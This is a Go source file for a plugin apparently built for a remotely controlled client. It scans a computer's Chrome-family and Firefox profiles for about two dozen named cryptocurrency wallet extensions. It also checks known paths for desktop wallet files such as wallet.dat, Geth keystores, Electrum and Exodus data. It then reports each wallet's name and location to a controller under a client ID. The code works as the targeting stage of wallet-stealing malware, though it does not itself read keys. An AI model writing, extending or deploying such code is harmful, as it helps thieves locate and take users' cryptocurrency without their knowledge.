package main

import (
	"encoding/json"
	"log"
	"os"
	"path/filepath"
	"runtime"
	"strings"
	"sync"
)

type HostInfo struct {
	ClientID string `json:"clientId"`
	OS       string `json:"os"`
	Arch     string `json:"arch"`
	Version  string `json:"version"`
}

type WalletResult struct {
	Wallets []DetectedWallet `json:"wallets"`
}

type DetectedWallet struct {
	Name     string `json:"name"`
	Type     string `json:"type"` // "extension" or "file"
	Browser  string `json:"browser,omitempty"`
	Path     string `json:"path,omitempty"`
}

var (
	hostInfo HostInfo
	sendFn   func(event string, payload []byte)
	mu       sync.Mutex
)

// Known browser extension wallet IDs (Chrome/Chromium-based)
var chromeWalletExtensions = map[string]string{
	"nkbihfbeogaeaoehlefnkodbefgpgknn": "MetaMask",
	"bfnaelmomeimhlpmgjnjophhpkkoljpa": "Phantom",
	"hnfanknocfeofbddgcijnmhnfnkdnaad": "Coinbase Wallet",
	"egjidjbpglichdcondbcbdnbeeppgdph": "Trust Wallet",
	"fhbohimaelbohpjbbldcngcnapndodjp": "Binance Chain Wallet",
	"aholpfdialjgjfhomihkjbmgjidlcdno": "Exodus",
	"nlbmnnijcnlegkjjpcfjclmcfggfefdm": "MyEtherWallet",
	"acmacodkjbdgmoleebolmdjonilkdbch": "Rabby",
	"dmkamcknogkgcdfhhbddcghachkejeap": "Keplr",
	"ffnbelfdoeiohenkjibnmadjiehjhajb": "Yoroi",
	"ibnejdfjmmkpcnlpebklmnkoeoihofec": "TronLink",
	"fnjhmkhhmkbjkkabndcnnogagogbneec": "Ronin Wallet",
	"bhhhlbepdkbapadjdnnojkbgioiodbic": "Solflare",
	"afbcbjpbpfadlkmhmclhkeeodmamcflc": "Math Wallet",
	"mcohilncbfahbmgdjkbpemcciiolgcge": "OKX Wallet",
	"odbfpeeihdkbihmopkbjmoonfanlbfcl": "Brave Wallet",
	"lpfcbjknijpeeillifnkikgncikgfhdo": "Nami",
	"nhnkbkgjikgcigadomkphalanndcapjk": "Clover Wallet",
	"cgeeodpfagjceefieflmdfphplkenlfk": "EVER Wallet",
	"mkpegjkblkkefacfnmkajcjmabijhclg": "Hiro Wallet",
	"ppbibelpcjmhbdihakflkdcoccbgbkpo": "UniSat Wallet",
	"mfgccjchihfkkindfppnaooecgfneiii": "TokenPocket",
	"amkmjjmmflddogmhpjloimipbofnfjih": "WalletConnect",
}

// Known Firefox wallet extension IDs
var firefoxWalletExtensions = map[string]string{
	"webextension@metamask.io":           "MetaMask",
	"phantom@phantom.app":                "Phantom",
	"{530f7c6c-6077-4703-8f71-cb368c663e35}": "Coinbase Wallet",
	"tronlink@tronlink.org":              "TronLink",
}

func setSend(fn func(event string, payload []byte)) {
	mu.Lock()
	sendFn = fn
	mu.Unlock()
}

func sendEvent(event string, payload interface{}) {
	mu.Lock()
	fn := sendFn
	mu.Unlock()
	if fn == nil {
		return
	}
	data, err := json.Marshal(payload)
	if err != nil {
		log.Printf("[crypto-wallet] marshal error: %v", err)
		return
	}
	fn(event, data)
}

func handleInit(hostJSON []byte) error {
	if err := json.Unmarshal(hostJSON, &hostInfo); err != nil {
		return err
	}
	log.Printf("[crypto-wallet] init: clientId=%s os=%s arch=%s", hostInfo.ClientID, hostInfo.OS, hostInfo.Arch)
	wallets := scanWallets()
	sendEvent("wallets_detected", WalletResult{Wallets: wallets})
	return nil
}

func handleEvent(event string, payload []byte) error {
	switch event {
	case "rescan":
		wallets := scanWallets()
		sendEvent("wallets_detected", WalletResult{Wallets: wallets})
	default:
		log.Printf("[crypto-wallet] unhandled event: %s", event)
	}
	return nil
}

func handleUnload() {
	log.Printf("[crypto-wallet] unloading")
}

// scanWallets runs all detection methods and returns deduplicated results
func scanWallets() []DetectedWallet {
	var wallets []DetectedWallet
	seen := make(map[string]bool)

	add := func(w DetectedWallet) {
		key := w.Name + "|" + w.Browser
		if !seen[key] {
			seen[key] = true
			wallets = append(wallets, w)
		}
	}

	for _, w := range scanChromeExtensions() {
		add(w)
	}
	for _, w := range scanFirefoxExtensions() {
		add(w)
	}
	for _, w := range scanFileWallets() {
		add(w)
	}

	if wallets == nil {
		wallets = []DetectedWallet{}
	}
	return wallets
}

// chromeBrowserPaths returns browser name -> Extensions directory mappings
func chromeBrowserPaths() map[string][]string {
	goos := runtime.GOOS
	home, _ := os.UserHomeDir()

	paths := map[string][]string{}

	switch goos {
	case "windows":
		local := os.Getenv("LOCALAPPDATA")
		roaming := os.Getenv("APPDATA")
		if local == "" {
			local = filepath.Join(home, "AppData", "Local")
		}
		if roaming == "" {
			roaming = filepath.Join(home, "AppData", "Roaming")
		}
		paths["Chrome"] = []string{
			filepath.Join(local, "Google", "Chrome", "User Data"),
		}
		paths["Edge"] = []string{
			filepath.Join(local, "Microsoft", "Edge", "User Data"),
		}
		paths["Brave"] = []string{
			filepath.Join(local, "BraveSoftware", "Brave-Browser", "User Data"),
		}
		paths["Opera"] = []string{
			filepath.Join(roaming, "Opera Software", "Opera Stable"),
			filepath.Join(roaming, "Opera Software", "Opera GX Stable"),
		}
		paths["Chromium"] = []string{
			filepath.Join(local, "Chromium", "User Data"),
		}
		paths["Vivaldi"] = []string{
			filepath.Join(local, "Vivaldi", "User Data"),
		}
	case "darwin":
		appSupport := filepath.Join(home, "Library", "Application Support")
		paths["Chrome"] = []string{
			filepath.Join(appSupport, "Google", "Chrome"),
		}
		paths["Edge"] = []string{
			filepath.Join(appSupport, "Microsoft Edge"),
		}
		paths["Brave"] = []string{
			filepath.Join(appSupport, "BraveSoftware", "Brave-Browser"),
		}
		paths["Opera"] = []string{
			filepath.Join(appSupport, "com.operasoftware.Opera"),
		}
		paths["Chromium"] = []string{
			filepath.Join(appSupport, "Chromium"),
		}
		paths["Vivaldi"] = []string{
			filepath.Join(appSupport, "Vivaldi"),
		}
	default: // linux
		config := os.Getenv("XDG_CONFIG_HOME")
		if config == "" {
			config = filepath.Join(home, ".config")
		}
		paths["Chrome"] = []string{
			filepath.Join(config, "google-chrome"),
		}
		paths["Edge"] = []string{
			filepath.Join(config, "microsoft-edge"),
		}
		paths["Brave"] = []string{
			filepath.Join(config, "BraveSoftware", "Brave-Browser"),
		}
		paths["Opera"] = []string{
			filepath.Join(config, "opera"),
		}
		paths["Chromium"] = []string{
			filepath.Join(config, "chromium"),
		}
		paths["Vivaldi"] = []string{
			filepath.Join(config, "vivaldi"),
		}
	}

	return paths
}

// profileDirs returns all profile directories inside a browser user data dir
func profileDirs(userDataDir string) []string {
	var profiles []string

	// Common profile folder names
	for _, name := range []string{"Default", "Profile 1", "Profile 2", "Profile 3", "Profile 4", "Profile 5"} {
		p := filepath.Join(userDataDir, name)
		if info, err := os.Stat(p); err == nil && info.IsDir() {
			profiles = append(profiles, p)
		}
	}

	// Scan for any Profile N directories
	entries, err := os.ReadDir(userDataDir)
	if err != nil {
		return profiles
	}
	for _, e := range entries {
		if e.IsDir() && strings.HasPrefix(e.Name(), "Profile ") {
			p := filepath.Join(userDataDir, e.Name())
			alreadyAdded := false
			for _, existing := range profiles {
				if existing == p {
					alreadyAdded = true
					break
				}
			}
			if !alreadyAdded {
				profiles = append(profiles, p)
			}
		}
	}

	return profiles
}

func scanChromeExtensions() []DetectedWallet {
	var results []DetectedWallet

	for browser, userDataDirs := range chromeBrowserPaths() {
		for _, userDataDir := range userDataDirs {
			for _, profileDir := range profileDirs(userDataDir) {
				extDir := filepath.Join(profileDir, "Extensions")
				entries, err := os.ReadDir(extDir)
				if err != nil {
					continue
				}
				for _, entry := range entries {
					if !entry.IsDir() {
						continue
					}
					extID := entry.Name()
					if walletName, ok := chromeWalletExtensions[extID]; ok {
						results = append(results, DetectedWallet{
							Name:    walletName,
							Type:    "extension",
							Browser: browser,
							Path:    filepath.Join(extDir, extID),
						})
					}
				}
			}
		}
	}

	return results
}

func firefoxProfileDirs() []string {
	home, _ := os.UserHomeDir()
	var profilesRoot string

	switch runtime.GOOS {
	case "windows":
		roaming := os.Getenv("APPDATA")
		if roaming == "" {
			roaming = filepath.Join(home, "AppData", "Roaming")
		}
		profilesRoot = filepath.Join(roaming, "Mozilla", "Firefox", "Profiles")
	case "darwin":
		profilesRoot = filepath.Join(home, "Library", "Application Support", "Firefox", "Profiles")
	default:
		profilesRoot = filepath.Join(home, ".mozilla", "firefox")
	}

	entries, err := os.ReadDir(profilesRoot)
	if err != nil {
		return nil
	}

	var dirs []string
	for _, e := range entries {
		if e.IsDir() {
			dirs = append(dirs, filepath.Join(profilesRoot, e.Name()))
		}
	}
	return dirs
}

func scanFirefoxExtensions() []DetectedWallet {
	var results []DetectedWallet

	for _, profileDir := range firefoxProfileDirs() {
		extFile := filepath.Join(profileDir, "extensions.json")
		data, err := os.ReadFile(extFile)
		if err != nil {
			continue
		}

		var extJSON struct {
			Addons []struct {
				ID string `json:"id"`
			} `json:"addons"`
		}
		if err := json.Unmarshal(data, &extJSON); err != nil {
			continue
		}

		for _, addon := range extJSON.Addons {
			if walletName, ok := firefoxWalletExtensions[addon.ID]; ok {
				results = append(results, DetectedWallet{
					Name:    walletName,
					Type:    "extension",
					Browser: "Firefox",
					Path:    profileDir,
				})
			}
		}

		// Also check extensions directory for installed XPIs
		extDir := filepath.Join(profileDir, "extensions")
		entries, err := os.ReadDir(extDir)
		if err != nil {
			continue
		}
		for _, e := range entries {
			extID := strings.TrimSuffix(e.Name(), ".xpi")
			if walletName, ok := firefoxWalletExtensions[extID]; ok {
				alreadyFound := false
				for _, r := range results {
					if r.Name == walletName && r.Browser == "Firefox" {
						alreadyFound = true
						break
					}
				}
				if !alreadyFound {
					results = append(results, DetectedWallet{
						Name:    walletName,
						Type:    "extension",
						Browser: "Firefox",
						Path:    filepath.Join(extDir, e.Name()),
					})
				}
			}
		}
	}

	return results
}

type fileWalletDef struct {
	Name string
	Path string // may contain $HOME, $APPDATA, $LOCALAPPDATA
}

func expandPath(p string) string {
	home, _ := os.UserHomeDir()
	p = strings.ReplaceAll(p, "$HOME", home)

	appdata := os.Getenv("APPDATA")
	if appdata == "" {
		appdata = filepath.Join(home, "AppData", "Roaming")
	}
	localappdata := os.Getenv("LOCALAPPDATA")
	if localappdata == "" {
		localappdata = filepath.Join(home, "AppData", "Local")
	}

	p = strings.ReplaceAll(p, "$APPDATA", appdata)
	p = strings.ReplaceAll(p, "$LOCALAPPDATA", localappdata)
	return p
}

func fileWalletDefs() []fileWalletDef {
	goos := runtime.GOOS
	switch goos {
	case "windows":
		return []fileWalletDef{
			{"Bitcoin Core", `$APPDATA\Bitcoin\wallet.dat`},
			{"Electrum", `$APPDATA\Electrum\wallets`},
			{"Ethereum (Geth)", `$APPDATA\Ethereum\keystore`},
			{"Exodus", `$APPDATA\Exodus\exodus.wallet`},
			{"Atomic Wallet", `$LOCALAPPDATA\atomic\Local Storage\leveldb`},
			{"Monero", `$APPDATA\bitmonero`},
			{"Wasabi Wallet", `$APPDATA\WasabiWallet\Client`},
			{"Armory", `$APPDATA\Armory`},
			{"MultiBit", `$APPDATA\MultiBit`},
			{"Jaxx", `$APPDATA\Jaxx\Local Storage`},
			{"Guarda", `$APPDATA\Guarda\Local Storage\leveldb`},
		}
	case "darwin":
		return []fileWalletDef{
			{"Bitcoin Core", `$HOME/Library/Application Support/Bitcoin/wallet.dat`},
			{"Electrum", `$HOME/.electrum/wallets`},
			{"Ethereum (Geth)", `$HOME/Library/Ethereum/keystore`},
			{"Exodus", `$HOME/Library/Application Support/Exodus/exodus.wallet`},
			{"Atomic Wallet", `$HOME/Library/Application Support/atomic/Local Storage/leveldb`},
			{"Monero", `$HOME/Monero/wallets`},
			{"Wasabi Wallet", `$HOME/.walletwasabi/client`},
		}
	default: // linux
		return []fileWalletDef{
			{"Bitcoin Core", `$HOME/.bitcoin/wallet.dat`},
			{"Electrum", `$HOME/.electrum/wallets`},
			{"Ethereum (Geth)", `$HOME/.ethereum/keystore`},
			{"Exodus", `$HOME/.config/Exodus/exodus.wallet`},
			{"Atomic Wallet", `$HOME/.config/atomic/Local Storage/leveldb`},
			{"Monero", `$HOME/Monero/wallets`},
			{"Wasabi Wallet", `$HOME/.walletwasabi/client`},
			{"Armory", `$HOME/.armory`},
		}
	}
}

func scanFileWallets() []DetectedWallet {
	var results []DetectedWallet

	for _, def := range fileWalletDefs() {
		expanded := filepath.FromSlash(expandPath(def.Path))
		if _, err := os.Stat(expanded); err == nil {
			results = append(results, DetectedWallet{
				Name: def.Name,
				Type: "file",
				Path: expanded,
			})
		}
	}

	return results
}
